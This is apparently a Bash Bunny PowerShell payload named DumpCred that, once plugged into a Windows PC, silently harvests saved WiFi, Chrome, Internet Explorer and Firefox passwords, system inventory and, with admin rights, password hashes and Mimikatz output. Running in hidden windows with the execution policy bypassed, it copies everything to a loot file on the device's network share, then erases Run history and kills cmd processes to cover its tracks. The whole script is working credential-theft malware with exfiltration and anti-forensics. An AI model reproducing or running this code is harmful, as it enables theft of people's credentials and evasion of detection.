
<#
.SYNOPSIS
   DumpCred 2.1
.DESCRIPTION
   Dumps all Creds from a PC 
.PARAMETER <paramName>
   none
.EXAMPLE
   DumpCred
#>

$_Version = "2.1.0"
$_BUILD = "1004"

# Share on bashbunny
$SHARE="\\172.16.64.1\e"
$LOOT="$SHARE\loot"


$FILE="$LOOT\$env:COMPUTERNAME.txt"
$TMPFILE=[System.IO.Path]::GetTempFileName()
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$LINE3="`n`n`n"

# Wait for Share
do { 
    Start-Sleep -s 1
    Write-Host -NoNewline "-"
} until (test-path \\172.16.64.1\e)

# Ok we got the connection.... Wait and Initiate the Handshake
# Handshake - create CON_REQ on Share. Bunny creates CON_OK if all is OK --- Check Share is writable
while ( -Not (Test-Path "$SHARE\CON_OK")) {
    Start-Sleep -s 1
    Write-Host -NoNewline "."
    if ( -Not (( Test-Path "$SHARE\CON_REQ") -or (Test-Path "$SHARE\CON_OK"))) { 
        Write-output " " | out-file "$SHARE\CON_REQ"
        Write-Host -NoNewline "+"
    }
}
Write-Host "!"

# Go on......

# For Outpu we are useing a local TMP File because OUT-File -append to a Fil on Share does not work :-(
# Remove TMP File

Remove-Item $TMPFILE -ErrorAction SilentlyContinue

# Set Output buffer width to 500
# Update output buffer size to prevent clipping in Visual Studio output window.
if( $Host -and $Host.UI -and $Host.UI.RawUI ) {
  $rawUI = $Host.UI.RawUI
  $oldSize = $rawUI.BufferSize
  $typeName = $oldSize.GetType( ).FullName
  $newSize = New-Object $typeName (500, $oldSize.Height)
  $rawUI.BufferSize = $newSize
}


"###DumpCreds " + $_VERSION + " Build " + $_BUILD + "     Admin Mode: " + $isAdmin| OUT-File $TMPFILE
"=======================================================" | OUT-File -append $TMPFILE
$LINE3 | Add-Content $TMPFILE


# Start all Scripts in $SHARE\PS as job

# First remove all jobs  I'm so bad....., don't care about running jobs
Stop-Job *
Remove-Job *

Write-Host "Wifi-Cred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1} -ErrorAction SilentlyContinue | Out-Null
Write-Host "ChromeCred" ;  start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1} -ErrorAction SilentlyContinue | Out-Null
Write-Host "IECred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1} -ErrorAction SilentlyContinue | Out-Null
Write-Host "FireFoxCred" ; start-job -RunAs32 -ArgumentList $SHARE {param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1} -ErrorAction SilentlyContinue | Out-Null
Write-Host "Inventory" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1} -ErrorAction SilentlyContinue | Out-Null
if ($isAdmin) {
    Write-Host "Hashes" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1} -ErrorAction SilentlyContinue | Out-Null
    Write-Host "M1m1k@tz" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\invoke-m1m1d0gz.ps1} -ErrorAction SilentlyContinue | Out-Null
}
Write-host "... Wait for end of jobs"
# Wait for all jobs
Get-Job | Wait-Job

Write-host "... Receiving results"
# Receive all results
Get-Job | Receive-Job | Out-File -Append $TMPFILE




#Move TMP File to Bunny
Write-host "Moving file to bunny"
move-item $TMPFILE -Destination $FILE -Force -ErrorAction SilentlyContinue

# Cleanup
# Remove Run History
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

Write-host "... Rename CON_OK to CON_EOF"
# Rename CON_OK to CON_EOF so bunny knows that all the stuff has finished
Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"

Write-host "... Kill cmds"
# Kill cmde.exe 
Stop-Process -name cmd -ErrorAction SilentlyContinue

Write-host "... Remove all Jobs"
# Remove all Jobs from Joblist
Remove-Job *